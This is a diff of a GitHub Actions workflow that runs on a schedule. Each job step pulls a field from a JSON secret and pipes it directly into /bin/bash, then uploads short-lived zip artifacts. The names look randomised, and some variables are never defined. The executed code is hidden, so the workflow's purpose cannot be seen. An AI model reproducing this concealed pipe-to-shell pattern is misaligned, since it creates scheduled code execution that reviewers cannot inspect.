@@ -1,30 +1,25 @@
 name: banxuejulang
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '19 3/6 * * *'
 
-jobs:  # 25923
+  schedule:
+    - cron: '31 4,10,16,22 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: banxuejulang
         env:
-          iz352: ${{ secrets.iz352 }}
+          gkbvb781: ${{ secrets.gkbvb781 }}
         run: |
-          echo $iz352 | jq -r .osnf1 | /bin/bash
-          echo $tekzh0194 | jq -r .lxpr56 | /bin/bash
-          echo $cb779 | jq -r .lqsx9312 | /bin/bash
-          echo $snskq53 | jq -r .rka50857 | /bin/bash
-          echo $etlx2 | jq -r .shu7 | /bin/bash
-          echo $y1 | jq -r .o1 | /bin/bash
-          echo $fakwn272 | jq -r .rbc31 | /bin/bash
-          echo $l460 | jq -r .fxh949 | /bin/bash
-          echo $rcj67390 | jq -r .vbr76 | /bin/bash
-          echo $aojx8583 | jq -r .cv78599 | /bin/bash
-          echo $uotqk70143 | jq -r .d183 | /bin/bash
-          echo $i60723 | jq -r .gijc282 | /bin/bash
-          echo $aoe8335 | jq -r .vtdsk1 | /bin/bash
+          printf '%s' "$gkbvb781" | jq -r .gjb21 | /bin/bash
+          printf '%s' "$s2725" | jq -r .m94 | /bin/bash
+          echo $bab21937 | jq -r .hz4923 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: T9SVASIb
+          path: "*.zip"
+          retention-days: 1
